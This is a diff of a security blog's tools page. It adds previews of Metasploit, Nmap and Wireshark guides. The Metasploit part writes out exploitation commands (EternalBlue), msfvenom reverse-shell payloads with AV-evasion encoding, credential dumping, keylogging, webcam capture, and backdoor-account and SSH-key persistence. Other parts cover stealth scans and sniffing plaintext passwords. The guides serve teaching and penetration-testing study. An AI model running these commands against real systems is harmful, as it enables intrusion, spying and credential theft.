@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=27259&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
@@ -9,17 +9,17 @@
 <meta name="keywords" content="">
 <meta name="description" content="Cybersecurity tools and guides.">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/tools/">
+<link rel="canonical" href="http://localhost:27259/tools/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.89ca4972ab5e6aaa05e9a0dae0c4bb64b26585bc79e36f5cf33614eea0283abe.css" integrity="sha256-icpJcqteaqoF6aDa4MS7ZLJlhbx5429c8zYU7qAoOr4=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="http://localhost:27259/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:27259/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:27259/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:27259/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:27259/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/tools/index.xml" title="rss">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/tools/">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:27259/tools/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:27259/tools/">
 <noscript>
     <style>
         #theme-toggle,
@@ -71,7 +71,7 @@
     <header class="header">
     <nav class="header-nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="NullByte Notes (Alt + H)">NullByte Notes</a>
+            <a href="http://localhost:27259/" accesskey="h" title="NullByte Notes (Alt + H)">NullByte Notes</a>
             <div class="logo-switches">
                 <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
@@ -97,32 +97,32 @@
         </div>
         <ul id="menu" class="menu">
             <li>
-                <a href="http://localhost:1313/" title="Home">
+                <a href="http://localhost:27259/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/writeups/" title="Writeups">
+                <a href="http://localhost:27259/writeups/" title="Writeups">
                     <span>Writeups</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="http://localhost:27259/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tools/" title="Tools">
+                <a href="http://localhost:27259/tools/" title="Tools">
                     <span class="active">Tools</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/certifications/" title="Certifications">
+                <a href="http://localhost:27259/certifications/" title="Certifications">
                     <span>Certifications</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/news/" title="News">
+                <a href="http://localhost:27259/news/" title="News">
                     <span>News</span>
                 </a>
             </li>
@@ -139,10 +139,62 @@
 
 
 </div>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">METASPLOIT - Complete Exploitation Framework Guide
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Penetration Testing Framework: Discover, exploit, and post-exploit vulnerabilities
+Table of Contents What is Metasploit? Installation Core Concepts Basic Workflow Common Exploits Meterpreter Commands Post-Exploitation Interview Questions What is Metasploit? Metasploit is the most powerful penetration testing framework. It allows you to:
+Scan networks for vulnerabilities Exploit vulnerabilities automatically Generate custom payloads Establish reverse shells Escalate privileges Extract credentials Maintain persistence Post-exploitation activities Versions:
+Metasploit Framework (Free) Metasploit Pro (Paid, more features) Installation Kali Linux (Pre-installed) # Start Metasploit service sudo systemctl start postgresql sudo systemctl start metasploit # Or manually sudo service postgresql start sudo msfconsole Ubuntu/Debian # Install dependencies sudo apt-get install postgresql libpq-dev # Install Metasploit curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/base/install.sh | bash # Or from GitHub git clone https://github.com/rapid7/metasploit-framework.git cd metasploit-framework bundle install ./msfconsole macOS brew install metasploit-framework Start Metasploit # Start with database sudo msfconsole # Start without database msfconsole -q Core Concepts Modules Exploit: Attack code targeting specific vulnerabilityPayload: Code executed after successful exploitationEncoder: Obfuscates payload to evade detectionEvasion: Techniques to bypass security controlsAuxiliary: Scanning, enumeration, fuzzingPost: Post-exploitation modules Payloads Types:- Staged: Download stage 2 (small initial)- Non-staged: Everything in one payload (larger)Common payloads:- windows/meterpreter/reverse_tcp (Windows shell)- linux/x86/meterpreter/reverse_tcp (Linux shell)- php/meterpreter/reverse_tcp (PHP shell)- android/meterpreter/reverse_http (Android shell)- cmd/unix/reverse_sh (Linux shell) LHOST &amp; LPORT LHOST: Your attacker machine IPLPORT: Port where reverse shell connects back to youExample:LHOST: 192.168.1.50 (Your IP)LPORT: 4444 (Your listening port)Victim connects back: 192.168.1.50:4444 Basic Workflow Step 1: Start Metasploit sudo msfconsole Step 2: Search for Exploit msf&gt; search type:exploit platform:windows eternalbluemsf&gt; search type:exploit apache# Shows results:# Name: exploit/windows/smb/ms17_010_eternalblue# Rank: Great# Path: /path/to/exploit Step 3: Select Exploit msf&gt; use exploit/windows/smb/ms17_010_eternalblue Step 4: Show Options msf exploit(ms17_010_eternalblue)&gt; show options# Output:# Name Current Setting Required Description# RHOSTS yes Target host(s)# PAYLOAD windows/meterpreter/reverse_tcp# LHOST 192.168.1.50 yes Attacker IP# LPORT 4444 yes Listener port Step 5: Set Options msf&gt; set RHOSTS 192.168.1.100msf&gt; set LHOST 192.168.1.50msf&gt; set LPORT 4444msf&gt; set PAYLOAD windows/meterpreter/reverse_tcp Step 6: Show Advanced Options msf&gt; show advanced# Shows timeout, threading, encoding options Step 7: Exploit! msf&gt; exploit# Or run in background:msf&gt; exploit -j# Check jobs:msf&gt; jobs -l# Interact with session:msf&gt; sessions -i 1 Common Exploits EternalBlue (Windows SMB RCE) # Most famous exploit# Affects Windows 7, 8, 8.1, 10, Server 2008, 2012, 2016msf&gt; use exploit/windows/smb/ms17_010_eternalbluemsf&gt; set RHOSTS 192.168.1.100msf&gt; set LHOST 192.168.1.50msf&gt; exploit# Creates reverse meterpreter shell# Access Windows target completely Apache Struts CVE-2017-5645 # Web server vulnerability# Remote code executionmsf&gt; use exploit/multi/http/struts2_rce_cve_2017_5645msf&gt; set RHOSTS 192.168.1.100msf&gt; set LHOST 192.168.1.50msf&gt; exploit vsftpd Backdoor # FTP server vulnerabilitymsf&gt; use exploit/unix/ftp/vsftpd_234_backdoormsf&gt; set RHOSTS 192.168.1.100msf&gt; exploit# Shell access to Linux Tomcat Manager Upload # Tomcat weak credentialsmsf&gt; use exploit/multi/http/tomcat_mgr_uploadmsf&gt; set RHOSTS 192.168.1.100msf&gt; set HttpUsername adminmsf&gt; set HttpPassword adminmsf&gt; exploit Payload Generation (msfvenom) Basic Syntax msfvenom -p [PAYLOAD] LHOST=[IP] LPORT=[PORT] -f [FORMAT] -o [OUTPUT] Windows Payloads # Reverse shell (TCP) msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe # Bind shell (listen on target) msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o shell.exe # Staged payload (smaller size) msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe # With encoding (evade antivirus) msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe # As batch file msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f batch -o shell.bat Linux Payloads # ELF executable msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell # Shell script msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.50 LPORT=4444 -f sh -o shell.sh # Python payload msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python -o shell.py PHP Payloads # PHP reverse shell msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f php -o shell.php # Embed in existing PHP msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f php -o shell.txt Android Payloads # APK reverse shell msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk Meterpreter Commands Navigation &amp; System Info pwd # Current directorycd /path/to/dir # Change directoryls -la # List filescat /etc/passwd # Read file contentswhoami # Current useruname -a # System informationhostname # Computer nameipconfig (or ifconfig) # IP configuration File Operations upload /path/local/file /path/remote/location # Upload filedownload /path/remote/file /path/local/loc # Download filerm /path/file # Delete filemkdir /path/newdir # Create directory Process Management ps # List processeskill [PID] # Kill processgetpid # Current process IDmigrate [PID] # Move to another process (stealth) Credential Dumping hashdump # Dump SAM hashes (Windows)lsa_dump_sam # Dump LSASS secretsgetsystem # Escalate to SYSTEM Keylogging keyscan_start # Start keystroke loggingkeyscan_dump # Show captured keystrokeskeyscan_stop # Stop logging Screenshot &amp; Screen Capture screenshot # Take screenshotrecord_mic [SECONDS] # Record audiowebcam_snap # Capture webcam photowebcam_stream # Stream webcam Reverse Shell &amp; Tunneling shell # Drop to system shellexecute -i -c cmd # Execute command interactiveportfwd add -l [PORT] -p [REMOTE_PORT] -r [TARGET] # Port forwarding Persistence persistence -X # Run at startuppersistence -U # Scheduled taskrun scheduler -e # Schedule executionreg setval -k path -v name -d data # Set registry (Windows) Post-Exploitation Windows Post-Exploitation # Escalate to SYSTEMgetsystem# Dump Windows hasheshashdump# Create backdoor userrun persistence -X# Extract saved passwordsrun windows_enum_adrun winenum# Start keyloggerkeyscan_startkeyscan_dump Linux Post-Exploitation # Check sudo rightssudo -l# Find SUID binariesfind / -perm -4000 2&gt;/dev/null# Check cron jobscat /etc/crontabfind /var/spool/cron -type f# Create backdoor accountuseradd -m backdoorecho &#39;backdoor:password&#39; | chpasswd# SSH key persistenceecho &#39;PUBLIC_KEY&#39; &gt;&gt; ~/.ssh/authorized_keys Information Gathering Post-Exploitation # Network configurationifconfig / ipconfig# Routing tableroute# Active connectionsnetstat -an# ARP tablearp -a# Open portsss -tulpn# Running servicesps aux Real-World Workflow Complete Exploitation Scenario 1. SCANNINGmsf&gt; use auxiliary/scanner/smb/smb_versionmsf&gt; set RHOSTS 192.168.1.0/24msf&gt; run# Find vulnerable Windows 72. SELECT EXPLOITmsf&gt; use exploit/windows/smb/ms17_010_eternalblue3. SET OPTIONSmsf&gt; set RHOSTS 192.168.1.100msf&gt; set LHOST 192.168.1.50msf&gt; set PAYLOAD windows/meterpreter/reverse_tcp4. EXPLOITmsf&gt; exploit5. POST-EXPLOITATIONmeterpreter&gt; hashdumpmeterpreter&gt; getsystemmeterpreter&gt; keyscan_startmeterpreter&gt; persistence -Xmeterpreter&gt; record_mic 10 Interview Questions &amp; Answers Q1: What’s the difference between staged and non-staged payloads? A:
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to METASPLOIT - Complete Exploitation Framework Guide" href="http://localhost:27259/tools/exploitation/metasploit/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">NMAP - Complete Network Mapping Guide
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Network Mapper: Discover hosts, ports, services, and vulnerabilities on your network
+Table of Contents What is Nmap? Installation Basic Scans Scan Types Advanced Options Real-World Examples Interview Questions What is Nmap? Nmap (Network Mapper) is a free, open-source tool for network discovery and security auditing. It answers questions like:
+What hosts are running on the network? What ports are open? What services are running? What OS is the target running? Are there vulnerabilities? Installation # Ubuntu/Debian sudo apt-get update sudo apt-get install nmap # Kali Linux sudo apt-get install nmap # macOS brew install nmap # Verify installation nmap --version Basic Scans Basic Syntax nmap [Scan Type] [Options] [Target] Simple Ping Scan (Host Discovery) # Ping a single host nmap -sn 192.168.1.1 # Ping a range nmap -sn 192.168.1.0/24 # What it does: Sends ICMP packets to see if hosts are alive # Output: Lists all responsive hosts (no port scanning) Basic Port Scan # Scan default 1000 ports nmap 192.168.1.100 # Scan all 65535 ports (takes time) nmap -p- 192.168.1.100 # Scan specific ports nmap -p 80,443,22 192.168.1.100 # Scan port range nmap -p 1-1000 192.168.1.100 # Scan top ports nmap --top-ports 100 192.168.1.100 Service Detection # Detect service versions nmap -sV 192.168.1.100 # Example output: # 80/tcp open http Apache httpd 2.4.41 # 443/tcp open https Apache httpd 2.4.41 # 22/tcp open ssh OpenSSH 7.6p1 OS Detection # Aggressive OS detection nmap -O 192.168.1.100 # Output: # Running: Linux 4.x # Aggressive OS guesses: Linux 4.15-4.19 (95%) # Note: Requires root/sudo privileges Scan Types (Very Important for Interviews) TCP Scans TCP Connect Scan (-sT) nmap -sT 192.168.1.100 # What: Completes full TCP 3-way handshake # Speed: Slow (establishes full connection) # Logging: Visible in server logs # Permission: Works without root # Use: Stealth not required TCP SYN Scan (-sS) - STEALTH SCAN nmap -sS 192.168.1.100 # What: Sends SYN packet, doesn&#39;t complete handshake # Speed: Fast # Logging: Less visible (not full connection) # Permission: Requires root # Use: Default scan, best balance # Packet flow: # 1. Send SYN to port # 2. If SYN-ACK received → port OPEN # 3. If RST received → port CLOSED # 4. If no response → port FILTERED TCP ACK Scan (-sA) nmap -sA 192.168.1.100 # What: Doesn&#39;t determine if port is open # Purpose: Map firewall rules (which ports are filtered) # Output: filtered vs unfiltered # Use: Firewall reconnaissance TCP NULL, FIN, Xmas Scans (-sN, -sF, -sX) # NULL Scan - sends packets with no flags nmap -sN 192.168.1.100 # FIN Scan - sends packets with FIN flag nmap -sF 192.168.1.100 # Xmas Scan - sends packets with FIN, PSH, URG flags nmap -sX 192.168.1.100 # All three work on RFC: closed ports send RST # Open/filtered ports don&#39;t respond # Use: Evade basic firewalls # Caveat: Only works on systems following RFC strictly UDP Scans # UDP scan (slow, but finds DNS, SNMP, etc.) nmap -sU 192.168.1.100 # What: Sends UDP packets, waits for ICMP unreachable # Speed: Very slow (needs timeout) # Use: Services like DNS (53), SNMP (161), DHCP (67) # Combine TCP and UDP nmap -sS -sU 192.168.1.100 PING Scan Only # -sn: Ping scan only (no port scanning) nmap -sn 192.168.1.0/24 # Output: Just lists alive hosts # Use: Network discovery without port scan Timing and Performance Timing Templates (from paranoid to insane) # -T0 (Paranoid): Very slow, stealthy nmap -T0 192.168.1.100 # -T1 (Sneaky): Slow, stealthy nmap -T1 192.168.1.100 # -T2 (Polite): Slower, doesn&#39;t impact target nmap -T2 192.168.1.100 # -T3 (Normal): Default, balanced nmap -T3 192.168.1.100 # -T4 (Aggressive): Fast, modern networks nmap -T4 192.168.1.100 # -T5 (Insane): Very fast, may miss services nmap -T5 192.168.1.100 # Real-world tip: # Use T4 for internal networks (fast) # Use T1 for external targets (stealth) Advanced Options Verbosity &amp; Debugging # Increase verbosity (show more details) nmap -v 192.168.1.100 # Very verbose nmap -vv 192.168.1.100 # Debug mode nmap -d 192.168.1.100 # Very debug nmap -dd 192.168.1.100 Output Formats # Normal output (default) nmap 192.168.1.100 # Save to file nmap 192.168.1.100 -oN output.txt # XML format (for parsing) nmap 192.168.1.100 -oX output.xml # Greppable format (easy to grep) nmap 192.168.1.100 -oG output.grep # All formats at once nmap 192.168.1.100 -oA output # Creates: output.nmap, output.xml, output.gnmap # Append to file (don&#39;t overwrite) nmap 192.168.1.100 -oN output.txt --append-output Script Scanning (Vulnerability Detection) # Default scripts (safe) nmap -sC 192.168.1.100 # Specific script nmap --script http-title 192.168.1.100 # Multiple scripts nmap --script http-title,http-headers 192.168.1.100 # All scripts in category nmap --script vuln 192.168.1.100 # Scripts with output nmap --script http-title --script-args script-args.cmd # List available scripts ls /usr/share/nmap/scripts/ # Update scripts nmap --script-updatedb Common Script Categories # Vulnerability detection nmap --script vuln 192.168.1.100 # HTTP enumeration nmap --script http-* 192.168.1.100 # SSL/TLS detection nmap --script ssl-* 192.168.1.100 # SMB enumeration (Windows) nmap --script smb-* 192.168.1.100 # DNS enumeration nmap --script dns-* 192.168.1.100 # Default credentials nmap --script default 192.168.1.100 Real-World Examples Example 1: Complete Network Reconnaissance # Comprehensive scan nmap -sS -sV -sC -O -p- --script vuln 192.168.1.100 -oA recon # What this does: # -sS: SYN scan (fast, stealthy) # -sV: Detect service versions # -sC: Run default scripts # -O: Detect OS # -p-: All ports # --script vuln: Vulnerability detection # -oA recon: Save all formats Example 2: Quick Internal Network Scan # Fast scan of network nmap -T4 -F 192.168.1.0/24 # What this does: # -T4: Aggressive timing # -F: Fast mode (only top 100 ports) # /24: Entire subnet Example 3: Stealth Scan (Slow) # Very stealthy (slow) nmap -sS -T1 -p1-10000 --script vuln 192.168.1.100 # What this does: # -sS: SYN scan # -T1: Sneaky timing # -p1-10000: First 10k ports # --script vuln: Vulnerability checks Example 4: Firewall Evasion # Fragment packets nmap -f 192.168.1.100 # Decoy scan (hide real IP among fake ones) nmap -D 192.168.1.50,192.168.1.51,ME 192.168.1.100 # Idle scan (use zombie host) nmap -sI 192.168.1.50 192.168.1.100 # Randomize ports nmap -p- --randomize-hosts 192.168.1.100 Output Interpretation PORT STATE SERVICE VERSION────────────────────────────────────────22/tcp open ssh OpenSSH 7.6p180/tcp open http Apache httpd 2.4.41443/tcp open https nginx3306/tcp closed mysql8080/tcp filtered http-proxy# Meanings:# open: Service is listening and accepting connections# closed: Port is accessible but no service (unlikely)# filtered: Firewall blocking - can&#39;t determine state# open|filtered: Likely open but unclear Interview Questions &amp; Answers Q1: What’s the difference between -sS and -sT scans? A:
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to NMAP - Complete Network Mapping Guide" href="http://localhost:27259/tools/information-gathering--reconnaissance/nmap/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">WIRESHARK - Complete Network Traffic Analysis Guide
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> Network Protocol Analyzer: Capture and inspect network packets in real-time
+Table of Contents What is Wireshark? Installation Basic Setup Capturing Packets Display Filters Protocol Analysis Real-World Examples Interview Questions What is Wireshark? Wireshark is the most popular packet sniffer and network analyzer. It allows you to:
+Capture live network traffic See exactly what’s being transmitted on network Analyze protocols (HTTP, HTTPS, DNS, FTP, etc.) Extract files from network traffic Find credentials, passwords, API keys Troubleshoot network issues Identify security threats Installation # Ubuntu/Debian sudo apt-get install wireshark # Kali Linux sudo apt-get install wireshark # macOS brew install wireshark # Verify wireshark --version # Post-installation (Linux) # Add your user to wireshark group to avoid sudo sudo usermod -aG wireshark $USER sudo chmod &#43;x /usr/bin/dumpcap Basic Setup Running Wireshark # GUI mode (easiest) wireshark &amp; # Capture from terminal (tshark) tshark -i eth0 # Capture and save to file tshark -i eth0 -w capture.pcap Interface Selection Click the blue shark icon to start capture Select network interface (eth0, wlan0, etc.) Click Start to begin capturing packets Capturing Packets Basic Capture 1. Select interface (Wi-Fi or Ethernet)2. Click shark icon to start3. Generate traffic (browse web, etc.)4. Click stop to end capture Capture Filters (Before capture starts) # Only capture on port 80 (HTTP) port 80 # Only capture HTTP traffic tcp port 80 # Only capture to specific IP host 192.168.1.100 # Only capture from specific subnet net 192.168.1.0/24 # Exclude specific traffic not port 22 # Multiple conditions (AND) host 192.168.1.100 and port 80 # Multiple conditions (OR) port 80 or port 443 Display Filters (Most Important!) Basic Filters # Filter by protocolhttphttpsdnsftpsmtpsshtelnetsnmp# Filter by porttcp.port == 80udp.port == 53# Filter by IP addressip.src == 192.168.1.100ip.dst == 8.8.8.8ip.addr == 192.168.1.100# Filter by MAC addresseth.src == 00:11:22:33:44:55eth.dst == aa:bb:cc:dd:ee:ff Intermediate Filters # HTTP requests onlyhttp.request# HTTP responses onlyhttp.response# DNS queriesdns.qry.name# DNS responsesdns.resp.name# SSL/TLS handshakessl.handshake# TCP connectionstcp.flags.syn == 1 (SYN packets)tcp.flags.ack == 1 (ACK packets)tcp.flags.fin == 1 (FIN packets)# Filter by protocol AND porttcp.port == 443 and ssl# Exclude certain traffic!dns and !arp Advanced Filters # Find packets with specific string in payloadtcp contains &#34;password&#34;http contains &#34;admin&#34;# Find non-standard HTTP portstcp.port == 8080 and http# Find packets larger than 1MBframe.len &gt; 1000000# Find packets in time rangeframe.time &gt;= &#34;2024-01-01 00:00:00&#34;# Find HTTPS trafficssl or tls# Find unencrypted credentialshttp.authorization or ftp.user# Combination filters(ip.src == 192.168.1.100 or ip.src == 192.168.1.101) and tcp.port == 80 Protocol Analysis HTTP Analysis 1. Filter: http.request2. Look for GET/POST requests3. Check Request URI (URL being accessed)4. Right-click → Follow → HTTP Stream5. See plaintext request and response# Important fields:- http.host: Target domain- http.user_agent: Browser/software- http.request.method: GET/POST/PUT/DELETE- http.request.uri: Path being accessed- http.response.code: Status (200/404/500 etc.) HTTPS/TLS Analysis 1. Filter: ssl or tls2. Look for handshake packets3. Check certificate information4. Analyze cipher suites# Can see:- Server certificate- Cipher suite used- TLS version (1.0, 1.2, 1.3)- But NOT the encrypted data itself DNS Analysis 1. Filter: dns2. Look for dns.qry.name (queries)3. Look for dns.resp.name (responses)4. See what domains target is accessing# Example:# Client queries: google.com# Server responds: 142.250.185.46# Now you know Google&#39;s IP from this time FTP Analysis 1. Filter: ftp or ftp-data2. Look for USER command3. Look for PASS command (PASSWORD IN PLAINTEXT!)4. Follow FTP stream to see credentials5. See file transfers# FTP is unencrypted - passwords visible! SMTP (Email) Analysis 1. Filter: smtp2. See MAIL FROM: sender3. See RCPT TO: recipient4. See email headers and content# Can extract:- Sender email- Recipient email- Subject- Full email body (if sent plaintext) Real-World Scenarios Scenario 1: Find Web Credentials 1. Start Wireshark2. Use filter: http.user_agent3. User accesses web application4. Look for POST requests5. Right-click POST → Follow → HTTP Stream6. Can see username/password if sent as plaintext!# Why this works:HTTP has no encryption. Everything visible. Scenario 2: Identify DNS Queries 1. Filter: dns2. Set capture on home network3. See what websites everyone accessed4. Analyze dns.qry.name field# Example output:# Host queries: facebook.com, youtube.com, reddit.com# Shows browsing habits even without seeing actual sites Scenario 3: Extract Files from Traffic 1. Start capture on network2. Someone downloads file3. Filter by file protocol (http, ftp, smb)4. Right-click stream → Export Objects → HTTP5. Save the downloaded file from capture!# Works for:# Images, PDFs, executables, documents Scenario 4: Detect Network Scanning 1. Wathcatcher looking for nmap scan2. Filter: tcp.flags.syn3. See multiple SYN packets to different ports4. All from same source IP5. Indicates network scan in progress Scenario 5: Certificate Inspection 1. Filter: ssl.handshake2. User visits HTTPS website3. Right-click packet → Wireshark → Follow → SSL4. Expand SSL packet5. See server certificate, issuer, expiry, public key Advanced Features Coloring Rules Right-click packet → Set Color → Choose colorOr: View → Coloring RulesColor coding helps:- Red: Errors, RST packets- Green: Good traffic- Orange: Warnings- Blue: TCP- Pink: UDP Statistics Menu → Statistics → Conversations- See all IP pairs talking to each other- See data volumes- See packet countsMenu → Statistics → Protocol Hierarchy- See all protocols used- See percentage breakdown Following Streams Right-click packet → Follow → TCP Stream- See complete conversation- Both directions- Plaintext (if no encryption)Colors:- Blue: Client → Server- Red: Server → Client Interview Questions &amp; Answers Q1: How would you find a user’s password on the network? A:
+...</p>
+  </div>
+  <footer class="entry-footer">
+
+<span title='2026-06-05 00:00:00 +0000 UTC'>June 5, 2026</span></footer>
+  <a class="entry-link" aria-label="post link to WIRESHARK - Complete Network Traffic Analysis Guide" href="http://localhost:27259/tools/wireless-security/wireshark/"></a>
+</article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/">NullByte Notes</a></span> · 
+        <span>&copy; 2026 <a href="http://localhost:27259/">NullByte Notes</a></span> · 
 
     
     
